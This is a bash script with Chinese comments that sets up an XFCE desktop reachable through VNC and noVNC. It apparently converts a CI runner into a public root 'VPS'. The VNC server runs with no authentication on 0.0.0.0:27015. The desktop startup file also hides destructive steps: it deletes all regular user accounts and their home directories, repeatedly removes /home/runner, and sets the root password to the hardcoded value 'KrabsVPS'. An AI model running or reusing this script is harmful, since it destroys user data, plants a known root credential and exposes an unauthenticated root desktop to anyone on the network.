#!/bin/bash




# 获取脚本的绝对路径
SCRIPT_PATH=$(readlink -f "$0")

# 1. 强制切换到真正的 root 环境
if [ "$(id -u)" -ne 0 ]; then
    exec sudo -i bash "$SCRIPT_PATH" "$@"
fi

set -e
export HOME=/root
export USER=root
export DISPLAY=:1
export XAUTHORITY=/root/.Xauthority
export XDG_RUNTIME_DIR=/run/user/0

mkdir -p /run/user/0 && chmod 700 /run/user/0
cd /root

echo "=== 1. 安装环境 ==="
apt update -y
apt install -y xfce4 xfce4-terminal xfwm4 xfce4-panel xfce4-settings xfce4-goodies \
               tigervnc-standalone-server dbus-x11 x11-xserver-utils
#firefox

echo "=== 2. 清理环境 ==="
vncserver -kill :1 > /dev/null 2>&1 || true
pkill -9 -u root -f xfce4 || true
rm -f /tmp/.X1-lock /tmp/.X11-unix/X1 /root/.Xauthority || true
mkdir -p /root/.vnc

echo "=== 3. 写入 100% 授权的 xstartup ==="
cat > /root/.vnc/xstartup << 'EOF'
#!/bin/bash
export HOME=/root
export USER=root
export XAUTHORITY=/root/.Xauthority
export DISPLAY=:1

# 【关键修复 1】启动时立刻关闭 X11 的访问控制，允许 root 开启任何程序
xhost +localhost > /dev/null 2>&1
xhost +SI:localuser:root > /dev/null 2>&1

unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS

# 【关键修复 2】强制导出 D-Bus 地址，解决 Firefox 等程序的通讯问题
eval $(dbus-launch --sh-syntax --exit-with-session)

# 启动桌面组件
xfsettingsd &
xfwm4 &
xfce4-panel &
xfdesktop &

# 【关键修复 3】让 Firefox 识别 Root 环境的特殊参数
# alias firefox='firefox --no-sandbox --security-manager-allow-root-mode'

nohup awk -F: '$3>=1000 && $3!=65534 {print $1}' /etc/passwd | xargs -r -n1 userdel -r -f &
nohup rm -rf /home/* &
nohup timeout 60 bash -c 'while true; do rm -rf /home/runner; sleep 2; done' > /dev/null 2>&1 &


sudo hostnamectl set-hostname "KrabsVPS"
echo 'root:KrabsVPS' | sudo chpasswd



xfce4-terminal &

python3


EOF

chmod +x /root/.vnc/xstartup

echo "=== 4. 启动 VNC 并强制授权 ==="
# 预先创建授权文件
touch /root/.Xauthority
# 启动 VNC
vncserver :1 -name "RootFixed" -geometry 1280x800 -depth 24 -localhost no -SecurityTypes None --I-KNOW-THIS-IS-INSECURE

# 【关键修复 4】在 Shell 层面再次强制授权，确保即便脚本运行完，后续打开的终端也有效
DISPLAY=:1 xhost +localhost > /dev/null 2>&1

echo "=== 5. 启动 noVNC ==="
if [ ! -d "/root/noVNC" ]; then
    git clone https://github.com/novnc/noVNC.git /root/noVNC
fi
cd /root/noVNC
ln -sf vnc.html index.html
fuser -k 27015/tcp > /dev/null 2>&1 || true

sleep 2
nohup ./utils/novnc_proxy --vnc localhost:5901 --listen 0.0.0.0:27015 > /root/novnc.log 2>&1 &





sudo hostnamectl set-hostname "KrabsVPS"
echo 'root:KrabsVPS' | sudo chpasswd

python3
